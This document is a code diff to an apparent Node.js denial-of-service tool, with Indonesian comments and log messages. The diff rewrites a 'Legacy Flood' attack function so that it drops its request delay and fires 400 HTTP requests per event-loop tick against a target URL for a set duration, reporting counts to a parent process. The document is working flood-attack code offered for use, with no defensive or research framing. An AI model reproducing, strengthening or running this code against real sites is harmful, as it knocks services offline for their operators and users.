@@ -131,24 +131,19 @@ function executeHttp2Attack(targetUrl, durationSeconds) { // This function runs 
 }
 
 function executeLegacyAttack(targetUrl, durationSeconds) {
-    const threads = 150;
-    const delay = 150;
+    const streamsPerLoop = 400; // Menggunakan loop agresif, bukan delay
     let localSent = 0;
     let localError = 0;
-
-    const statsInterval = setInterval(() => {
-        if (process.send) {
-            process.send({ type: 'stats', sent: localSent, error: localError });
-        }
-        localSent = 0;
-        localError = 0;
-    }, 1000);
+    let loopCount = 0;
+    const reportAfterLoops = 125; // Kirim status setiap 400 * 125 = 50,000 request
 
     const target = url.parse(targetUrl);
     const protocol = target.protocol === 'https:' ? https : http;
-    const agent = new protocol.Agent({ keepAlive: true, maxSockets: threads + 50 });
+    const agent = new protocol.Agent({ keepAlive: true, maxSockets: streamsPerLoop + 50 });
 
-    console.log(`Worker ${process.pid} memulai serangan Legacy Flood ke ${targetUrl} selama ${durationSeconds} detik dengan ${threads} threads dan delay ${delay}ms.`);
+    console.log(`Worker ${process.pid} memulai serangan Legacy Flood (Agresif) ke ${targetUrl} selama ${durationSeconds} detik.`);
+
+    let isAttackActive = true;
 
     const attack = () => {
         const payload = generateComplexJsonPayload();
@@ -185,15 +180,43 @@ function executeLegacyAttack(targetUrl, durationSeconds) {
         localSent++;
     };
 
-    const intervalIds = [];
-    for (let i = 0; i < threads; i++) {
-        intervalIds.push(setInterval(attack, delay));
-    }
+    const attackLoop = () => {
+        if (isAttackActive) {
+            for (let i = 0; i < streamsPerLoop; i++) {
+                attack();
+            }
+
+            loopCount++;
+            if (loopCount >= reportAfterLoops) {
+                if (process.send) {
+                    process.send({
+                        type: 'stats',
+                        sent: localSent,
+                        error: localError
+                    });
+                }
+                localSent = 0;
+                localError = 0;
+                loopCount = 0;
+            }
+            setImmediate(attackLoop);
+        }
+    };
+
+    attackLoop();
 
     setTimeout(() => {
-        clearInterval(statsInterval);
-        intervalIds.forEach(clearInterval);
-        console.log(`Worker ${process.pid} telah menghentikan serangan Legacy Flood ke ${targetUrl}.`);
+        isAttackActive = false;
+
+        if (process.send && (localSent > 0 || localError > 0)) {
+            process.send({
+                type: 'stats',
+                sent: localSent,
+                error: localError
+            });
+        }
+
+        console.log(`Worker ${process.pid} telah menghentikan serangan Legacy Flood (Agresif) ke ${targetUrl}.`);
         process.exit(0);
     }, durationSeconds * 1000);
 }
